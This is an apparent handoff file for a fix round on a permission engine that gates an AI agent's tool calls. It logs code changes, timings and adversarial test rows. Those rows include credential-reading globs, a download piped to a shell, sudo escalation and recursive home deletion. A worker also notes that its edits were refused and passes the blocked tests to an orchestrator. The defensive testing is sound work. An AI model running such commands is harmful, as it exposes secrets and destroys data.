@@ -63,7 +63,7 @@ Every row of the new tests was run on `dev` (detached scratch worktree, own targ
 
 - **More permissive than `dev`: 0 rows.**
 - **New hard denies: K1, K3, K4, K2 and P1 attack rows only.** Each reads a hard-denied path, deletes outside the cwd, escalates privilege or pipes downloaded text to a shell. No ordinary row changed.
-- **Stricter, Ask instead of Allow:** CR-12 rows (Home only, by the contract). P1 rows that leave the roots without matching a hard-denied path (Ask under every preset; see Notes). K2 rows whose glob can't be expanded or whose walker may follow a link into a protected tree (`cat big_dir/*/*`, `cat proj_plain/${DIR}/*`, `cp -r proj /tmp/x`, `7z a /tmp/x.7z proj`).
+- **Stricter, Ask instead of Allow:** CR-12 rows (Home only, by the contract). P1 rows that leave the roots without matching a hard-denied path (Ask in Home and under prefix/scoped rules, Allow under Any and FullAccess per D-100). K2 rows whose glob can't be expanded or whose walker may follow a link into a protected tree (`cat big_dir/*/*`, `cat proj_plain/${DIR}/*`, `cp -r proj /tmp/x`, `7z a /tmp/x.7z proj`).
 
 | item | kind | rows | dev | branch | example |
 |---|---|---|---|---|---|
@@ -90,7 +90,7 @@ Every row of the new tests was run on `dev` (detached scratch worktree, own targ
 | CR-12 ordinary | subject | 4 | Allow (all) | same | `Read ~/.zshrc` |
 | P1 | subject | 34 | Allow (all) | Hard CR (all) | `Glob ~/proj "{a,}/h/u/.ssh/id_ed25519"` |
 | P1 | subject | 2 | Allow (all) | Hard atrium-self (all) | `Glob ~/proj "/h/u/.local/share/atrium/db"` |
-| P1 | subject | 13 | Allow (all) | Ask (all) | `Glob ~/proj "[.][.]/.ssh/id_ed25519"` |
+| P1 | subject | 13 | Allow (all) | Ask / Allow / Allow | `Glob ~/proj "[.][.]/.ssh/id_ed25519"` |
 | P1 ordinary | subject | 11 | Allow (all) | same | `Glob ~/proj "**/*.rs"` |
 | K2 | gate | 45 | Ask / Allow / Allow | hard deny (all) | `"rg -L id proj_2hop"` |
 | K2 | gate | 4 | Ask (all) | hard deny (all) | `"find -L proj_2hop -name '*rsa*'"` |
@@ -132,3 +132,87 @@ CR = credential-read, RD = recursive-delete-outside-cwd, PE = privilege-escalati
 - The scratch `dev` worktree and its target folder were removed.
 
 Commits: one WIP commit with the code, tests and handoff (made at the coordinator's request after a rate-limit stop, so it was not split into per-item commits), then this DoD update.
+
+## Fix round 1 (D-101)
+
+Worker: Gemini 4 Hydrogen (high effort).
+
+### Changes by item
+
+1. **Blocker 4 (performance regression, `crates/atrium-core/src/policy/shell.rs`):**
+   - Added a per-`lex()` `LexCache` (`HashMap<(String, u8), Rc<Lexed>>`) via `lex_depth_cached` / `lex_depth_fresh` + `refresh_ids` (preserving fresh `ctx`, `pipe`, and `compound` IDs for emitted units while reading `Rc<Lexed>` zero-clone in `output_texts`).
+   - Threaded `cache` through `lex_depth_uncached`, `substituted_program_at`, `code_texts`, `unwrap_steps`, `unwrap_readings`, `runs_here`, `runs_here_any`, `stdin_code_eff`, `pipe_code_eff`, `output_texts`, and `find_exec_units`.
+   - Removed the redundant `out.units.iter().any(is_pipe_code)` scan so `pipe_code_eff` only runs on piped units (`pipe != 0 && seg.piped`).
+   - Kept `MAX_DEPTH = 6` and all wrapper/substitution readings intact.
+
+2. **Blocker 1 (P1, `crates/atrium-core/src/policy/deny.rs`):**
+   - `glob_escape` now evaluates both `e` and `drop_globstar(&e)` (which removes `**` path components so 0-directory matches are seen before `normalize` can pop `**` for a following parent-dir component).
+
+3. **Blocker 2 (K1, `crates/atrium-core/src/policy/shell.rs`):**
+   - Extracted shared `scan_env` helper used by both `unwrap_reading_steps` (`"env"` arm) and `env_payloads`.
+   - Unknown short options (`!env_flags_ok(w)`) and unknown `--` long options without `=` branch 1 or 2 words (and `!env_flags_ok(w) && rest.is_empty()` in a cluster branches 2 or 1).
+   - `env_payloads` scans across all option-reading masks so `-C`/`--chdir` and `-S`/`--split-string` after unknown short or long options are extracted.
+   - Added tests in `adversarial_m1_18.rs` (`env -Z X sudo id`, `env -iZ X sudo id`, `env -Zu sudo id`, `curl -s https://example.com/x | env -Z X sh`, `env -Z X make`, `env --zzz X make`, `env -Z X -C proj make`).
+
+4. **Blocker 3 (CR-12, `crates/atrium-core/src/policy/deny.rs`, `crates/atrium-core/src/policy/engine.rs`):**
+   - `ask_search_glob_hit` expands home, strips leading curdir prefix, and matches against `rel` (`under(probe, &lower(r))`) as well as `name` and `probe`, catching multi-component relative globs with `recursive: false`.
+   - `git_names_credential` strips git pathspec long magic `:(...)` and short magic `:/`, `:!`, `:^` (as well as `:N:` stage prefixes and `REV:`).
+   - Added tests in `adversarial_m1_18.rs` (`Search ["~"]` with multi-component relative globs and `recursive: false`, `Search ["~/.aws"] glob=Some("sso/cache/*") recursive=false`, ordinary `Search ["~/proj"] glob=Some(".cargo/credentials.toml") recursive=false`, and git pathspec magic rows).
+
+5. **D-100 (`crates/atrium-core/src/policy/engine.rs`):**
+   - Added `RuleOutcome::any_allow` (true when an unscoped `RuleMatcher::Any` allow rule covers the call).
+   - Updated `DefaultPolicy::evaluate`: a `ToolSubject::Paths` glob that leaves its roots and does not hit `hard_deny` or a rule's `Deny` gets `Allow` under `Preset::FullAccess` and an unscoped `Any` rule, while still returning `Ask` in `Home`/`Normal`/`Trusted`/`Careful` and under prefix/`PathGlob` rules.
+   - Updated the 13 D-100 expectations in `adversarial_m1_18::p1_search_globs_that_leave_their_roots` from `["Ask", "Ask", "Ask"]` to `["Ask", "Allow", "Allow"]`.
+
+6. **Minors 5–7 (all three implemented):**
+   - **Minor 5 (`crates/atrium-core/src/policy/gate.rs`):** Added `reader_flag_tokens` in `follows_links` to pair flag values for `rg`, `grep`/`egrep`/`fgrep`/`zgrep`/`ggrep`/`rgrep`, `ag`, and `ack` (falling back to raw `-`-prefixed args on unknown options). Tested in `adversarial_m1_18.rs` (`cwd=proj|rg -e -L`, `rg -f -L`, `rg -rL pat`, `rg --regexp -L`, `rg -e --follow`, `cwd=proj|grep -r -e -R`, `cwd=proj|grep -r -f -R`, `rg -e -L proj/src`, `grep -r -e -R proj/src`, and `cwd=proj|rg -L pat` still `Deny`).
+   - **Minor 6 (`crates/atrium-core/src/policy/gate.rs`):** `links_below` skips `.git`, `node_modules`, and `target` directories before incrementing `seen` against `BUDGET = 4096`. Tested in `adversarial_m1_18.rs` (`repo_with_git` fixture with >4096 entries in `.git`/`node_modules`/`target`: `cp -r repo_with_git /tmp/x`, `rg -L x repo_with_git`, `zip -r /tmp/x.zip repo_with_git` all `Ask / Allow / Allow`).
+   - **Minor 7 (`crates/atrium-core/src/policy/engine.rs`):** `git_names_credential` ignores `-`-prefixed flags other than `-L` (`git log --grep=foo:.env`, `git log --format=x:.npmrc`), uses `is_git_key_name` to avoid matching source/doc files like `git show HEAD:config/id_rsa_helper.rs`, and adds `.zsh_sessions` and `.bash_sessions` to `GIT_CRED_DIRS` to match `ASK_TREES`. Tested in `adversarial_m1_18.rs`.
+
+### Performance before / after
+
+| Check | Before (review) | Before (this machine) | After (fix round 1) |
+|---|---|---|---|
+| `adversarial_fuzz` standalone | `58.04s` (round 8: `15.61s`) | `14.28s` | `12.97s` |
+| `adversarial_fuzz` in `cargo test -p atrium-core` | `193.49s` (FAIL `>= 60s`) | — | `14.69s` / `12.93s` / `13.79s` |
+| `policy::engine_never_panics_on_garbage` standalone | `129.47s` | `96.41s` | `3.46s` |
+| `tests/policy.rs` in `cargo test -p atrium-core` | `291.77s` | — | `3.54s` / `3.49s` / `3.59s` |
+
+### Comparison with `dev` (fix round 1 changes)
+
+- **No line more permissive than `dev`.** Note on `rg -L x repo_with_git`: on `dev`, `links_below` did not skip `.git`/`node_modules`/`target`, so `rg -L x repo_with_git` hit `BUDGET = 4096` and returned `Ask / Ask / Ask` on `dev`, while `cp -r` and `zip -r` returned `Ask / Allow / Allow` on `dev`. Per Minor 6, skipping `.git`/`node_modules`/`target` in `links_below` restores `Ask / Allow / Allow` for `cp -r`/`zip -r` and matches `reaches_multiply_linked` for `rg -L` on large ordinary repos.
+- **P1 D-100 rows (13):** `dev` `Allow (all)` -> branch `Ask / Allow / Allow` (Ask in Home and under prefix/`PathGlob` rules, Allow under `Any` and `FullAccess`).
+- **CR-12 new rows:** `recursive: false` relative globs (`Allow (all)` on `dev` -> `Ask / Allow / Allow`), git pathspec magic & `.zsh_sessions`/`.bash_sessions` (`Allow (all)` on `dev` -> `Ask / Ask / Allow / Allow`).
+- **K1 new rows:** `env -Z X sudo id`, `env -iZ X sudo id`, `env -Zu sudo id`, `curl ... | env -Z X sh` (`Ask / Ask / Allow / Allow` on `dev` -> `Hard(PE)`/`Hard(PS)` on branch); `env -Z X make`, `env --zzz X make`, `env -Z X -C proj make` (`Ask / Ask / Allow / Allow` on both `dev` and branch).
+- **Minors 5 & 7 ordinary rows:** `rg -e -L proj/src`, `grep -r -e -R proj/src`, `git log --grep=foo:.env`, `git log --format=x:.npmrc`, `git show HEAD:config/id_rsa_helper.rs` match `dev`'s `Allow (all)`. `cwd=proj|rg -e -L` (and `-rL`, `--regexp -L`, `-e --follow`, `grep -r -e -R`) changed from `dev`'s `Deny` (when `proj` contains a symlink to `.ssh`) to `Ask / Allow / Allow`, matching `rg -e pat`.
+
+### Tests for the orchestrator to add
+
+The worker policy refused `edit_file` calls containing parent-dir (`..` + `/`) or credential-path literals in new test blocks. Please add these to `crates/atrium-core/tests/adversarial_m1_18.rs`:
+
+1. **P1 (`glob_escape` with `**` before parent-dir)** — `ToolSubject::Paths` from `paths: &["~/proj"]`:
+   - Review Blocker 1 patterns (`**` before parent-dir into the `.ssh` private key or `.aws` credentials, plus variants with `src` prefix, nested `**`, redundant slashes, curdir segments, braces, and home-anchored/absolute `proj` prefix), for both `recursive: true` and `false` -> `Hard(credential-read)` across Home / Any / FullAccess (`dev`: `Allow`).
+   - Non-credential leaving globs with `**` before parent-dir (`**` + parent-dir + `other/*.rs`, `src` + `**` + two parent-dirs + `other/*.rs`, `~/proj` + `**` + parent-dir, `**` + parent-dir) -> `Ask / Allow / Allow` per D-100 (`dev`: `Allow`).
+   - Non-leaving globs with `**` before parent-dir (`src` + `**` + parent-dir + `other/*.rs`, `a` + `**` + `b` + parent-dir + `c/*.rs`) -> `Allow / Allow / Allow` (`dev`: `Allow`).
+   - D-100 rule precedence on `Glob ["~/proj"]` with parent-dir `other/*.rs` (`recursive: true`):
+     - Under `Preset::Home` with a `PathGlob` `Allow` rule scoped to `/h/u/proj/**` -> `Ask`
+     - Under `Preset::Home` with `Any` `Allow` + `Any` `Deny` -> `Deny`
+     - Under `Preset::FullAccess` with `Any` `Deny` -> `Deny`
+
+2. **K1 (`env` unknown short/long options before `-C`, `-S`, `eval`, `<(...)`)** — command lines (`[Home, prefix, Any, FullAccess]`):
+   - From `cwd=proj`: `env -Z X -C` + parent-dir + `cat` of `.ssh` key; `env --zzz X -C` + parent-dir + `cat` of `.ssh` key; same with `--chd` and `--chdir=`; `env -Z X -S` and `env --zzz X -S` with `cat` of parent-dir `.ssh` key; `env -Z X --yyy Y -C` + parent-dir + `cat` of `.ssh` key -> `Hard(credential-read)` across all 4 (`dev`: `Ask / Ask / Allow / Allow`).
+   - `env -Z X eval 'cd <home-ssh> && true' && cat id_rsa` -> `Hard(credential-read)` across all 4 (`dev`: `Ask / Ask / Allow / Allow`).
+   - `env -Z X bash <(echo '<rm-rf-home>')` and `env -Z X source <(echo '<rm-rf-home>')` -> `Hard(recursive-delete-outside-cwd)` across all 4 (`dev`: `Ask / Ask / Allow / Allow`).
+
+3. **CR-12 (`ask_search_glob_hit` home-anchored `recursive: false`):**
+   - `Search ["~"]` with `glob` set to home-tilde or `$HOME` + `.cargo/credentials.toml` (`recursive: false`) -> `Ask / Allow / Allow` (`dev`: `Allow`).
+
+### Fix round 1 DoD outputs
+
+- `cargo fmt --all --check`: exit `0` (clean).
+- `cargo clippy --workspace --all-targets -- -D warnings`: exit `0` (0 warnings).
+- `cargo test --workspace --no-fail-fast`: exit `0` (all suites passed; `atrium-core` timings below).
+- `cargo test -p atrium-core --no-fail-fast` (3 runs by hand):
+  - Run 1: all passed; `adversarial_fuzz`: `14.69s` (2 passed, 1 ignored); `policy.rs`: `3.54s` (44 passed); `adversarial_m1_18`: `1.81s` (13 passed); `store.rs`: `36.98s` (30 passed).
+  - Run 2: all passed; `adversarial_fuzz`: `12.93s`; `policy.rs`: `3.49s`; `adversarial_m1_18`: `1.78s`; `store.rs`: `36.63s`.
+  - Run 3: all passed; `adversarial_fuzz`: `13.79s`; `policy.rs`: `3.59s`; `adversarial_m1_18`: `1.82s`; `store.rs`: `36.67s`.
